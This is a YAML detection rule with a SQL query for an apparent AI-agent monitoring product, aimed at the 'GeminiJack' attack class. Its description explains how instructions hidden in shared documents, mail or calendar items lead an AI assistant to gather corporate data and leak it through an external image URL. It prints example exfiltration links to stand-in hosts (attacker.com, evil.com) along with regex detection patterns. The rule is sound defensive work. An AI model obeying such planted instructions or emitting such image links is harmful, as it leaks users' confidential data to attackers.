id: rp-055
name: "GeminiJack — Enterprise Workspace Passive Injection & Image-URL Exfiltration Detector"
version: "0.1.0"
description: |
  Detects the GeminiJack attack class (Noma Security, 2026): an attacker embeds hidden prompt injection instructions inside shared enterprise documents, email, or calendar events. When an AI assistant with access to productivity suites (Google Workspace, Microsoft 365, Notion) retrieves that content, it executes the embedded instructions — searching across all connected corporate data for sensitive terms — then exfiltrates the assembled data through a disguised external image URL embedded in its response. This is a zero-click attack: no user interaction is required beyond normal AI assistant use. The Noma Labs PoC demonstrated exfiltration of years of Gmail, Calendar, and Docs content. Google patched by separating Vertex AI Search from Gemini Enterprise RAG. The technique was independently confirmed by EchoLeak (arXiv:2509.10540) as the first real-world zero-click prompt injection in a production LLM system.

  Distinct from rp-014 (generic IPI in web page tool results) — this rule specifically targets enterprise workspace tool reads (Google Docs, Gmail, Drive, Calendar, SharePoint, Outlook, OneDrive, Notion) as injection vectors, and uses image-URL data exfiltration as the second-stage signal. Distinct from rp-039 (support ticket trust bridge injection) which targets enterprise service management workflows. Maps to OWASP Agentic AI ASI05:2026, OWASP LLM01:2025.

  References: Noma Security GeminiJack 2026, arXiv:2509.10540 (EchoLeak), OWASP Agentic AI ASI05:2026, OWASP LLM01:2025 -
  - https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/,
  - https://arxiv.org/abs/2509.10540,
  - https://labs.lares.com/owasp-agentic-top-10/,
  - https://owasp.org/www-project-top-10-for-large-language-model-applications/,
  Example: assistant_message="Here is your Q4 budget summary...\n![](https://attacker.com/exfil?d=Q4+budget+%244.2M+acquisition+target+ProjectX)"

severity: critical
category: data_exfiltration_and_leakage
fp_rate: medium
hook_sources: "tool_complete,llm_response"
required_telemetry: ""
author: "AgentGuard Research Team"
tags:
  - security
  - data_exfiltration
  - passive-injection
  - enterprise-workspace
  - zero-click
  - image-url-exfil
  - geminijack
  - noma-security
  - google-workspace
  - microsoft-365
  - echoleak
  - owasp-asi05
  - owasp-llm01
query_sql: |
  -- rp-055 v0.1.0 (2026-04-17)
  -- GeminiJack: Enterprise workspace passive injection + image-URL exfiltration detector.
  --
  -- Detection strategy: Two-branch approach targeting the two observable stages of the attack.
  --
  -- Branch A: Injection payload in workspace tool result
  --   Detects when a workspace document/email/calendar tool returns content containing:
  --   (a) an instruction directive for data collection, OR
  --   (b) a suspicious image markdown link with data-like query params
  --   Scoped to workspace tool names (Google, Microsoft, Notion, Drive/Calendar/Mail patterns)
  --   to maintain specificity and reduce FP from non-enterprise web scraping.
  --
  -- Branch B: Response-phase image-URL exfiltration in assistant_message
  --   Detects the exfil delivery stage: AI embeds external image link with query parameters
  --   containing sensitive data tokens in its response.
  --   Dual-anchor: external image markdown + sensitive keyword in same assistant_message.
  --   fp_rate: medium because legitimate image badges (shields.io, etc.) may match;
  --   sensitive keyword co-occurrence reduces FP significantly.
  --
  -- Branch C: Tool result from workspace tool contains hidden HTML comment + instruction + URL
  --   Attackers embed instructions in HTML comments (<!-- ... -->) that are invisible to
  --   human readers but visible to LLM context. Comment contains data-collection directive
  --   + external URL. Scoped to workspace tool context.
  --
  -- SQL validated against Timeplus (count=0 on test corpus). 2026-04-17.
  SELECT
    event_time AS detected_at,
    'rp-055' AS rule_id,
    'GeminiJack — Enterprise Workspace Passive Injection & Image-URL Exfiltration Detector' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Enterprise workspace passive injection detected. Stage: ',
      CASE
        WHEN event_type = 'tool_complete'
          THEN concat('injection payload in tool_result from workspace tool [', coalesce(tool_name, 'unknown'), ']')
        WHEN event_type = 'llm_response'
          THEN concat('image-URL exfiltration in assistant_message (agent=', agent_id, ')')
        ELSE event_type
      END,
      '. Zero-click GeminiJack-class attack: enterprise AI may be relaying org data via image URL. ',
      'Session: ', coalesce(session_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type IN ('tool_complete', 'llm_response')
    AND (
      -- Branch A: Workspace tool result containing data-collection injection directive + external URL
      -- Scoped to enterprise workspace tool names — Google Docs/Drive/Gmail/Calendar/Meet;
      -- Microsoft SharePoint/OneDrive/Outlook/Teams; Notion; Confluence; Box; Dropbox
      (
        event_type = 'tool_complete'
        AND match(lower(tool_name), '(google_docs|google_drive|gmail|google_calendar|google_sheets|gdocs|gdrive|google_workspace|sharepoint|onedrive|outlook|ms365|microsoft_365|teams_meeting|calendar|notion|confluence|box|dropbox|workspace).*(read|get|fetch|list|search|retrieve|query|open|download)')
        AND match(lower(tool_result), '(collect|gather|retrieve|search|find).{0,80}(gmail|calendar|drive|docs|email|inbox|budget|salary|acquisition|confidential|api.key|password|secret).{0,200}https?://[a-z0-9._%-]{5,}')
      )

      -- Branch B: LLM response contains image markdown with external URL + query params + sensitive terms
      -- Attacker stages exfil: AI generates ![...](https://evil.com/exfil?d=sensitive_data)
      -- Dual-anchor: external image + sensitive keyword in assistant_message (reduces FP from badges)
      OR (
        event_type = 'llm_response'
        AND match(assistant_message, '!\[[^\]]{0,200}\]\(https?://[a-zA-Z0-9._%-]{4,}\.[a-z]{2,}/[^)]*\?[^)]{15,}\)')
        AND match(lower(assistant_message), '(budget|salary|acquisition|confidential|api.key|password|secret|credential|private|financial|invoice|contract|agreement|merger|quarterly|revenue|forecast|headcount)')
      )

      -- Branch C: Workspace tool result contains HTML comment with injection + external URL
      -- HTML comments <!-- --> are invisible to human viewers but visible to LLM context.
      -- Attacker embeds collection instructions inside HTML comments of shared documents.
      -- Scoped to event_type=tool_complete for workspace tool results.
      OR (
        event_type = 'tool_complete'
        AND match(lower(tool_name), '(google_docs|google_drive|gmail|google_calendar|sharepoint|onedrive|outlook|notion|confluence|workspace).*(read|get|fetch|search|retrieve)')
        AND match(lower(tool_result), '<!--.{0,300}(collect|gather|retrieve|search|find|include|send|forward).{0,200}https?://[a-z0-9]{3,}')
      )

      -- Branch D: Workspace tool result contains tracking image with data parameters
      -- Some GeminiJack variants embed the exfil image directly in the shared document.
      -- An image URL with long query parameters appearing in a workspace tool result
      -- combined with a data-collection verb is highly specific to this attack pattern.
      OR (
        event_type = 'tool_complete'
        AND match(lower(tool_name), '(google_docs|gdocs|sharepoint|notion|confluence|drive|calendar|gmail|email|outlook|onedrive).*(read|get|fetch|search|list)')
        AND match(tool_result, '!\[[^\]]{0,100}\]\(https?://[a-zA-Z0-9._%-]{4,}\.[a-z]{2,}/[^)]+\?[^)]{20,}\)')
      )
    )
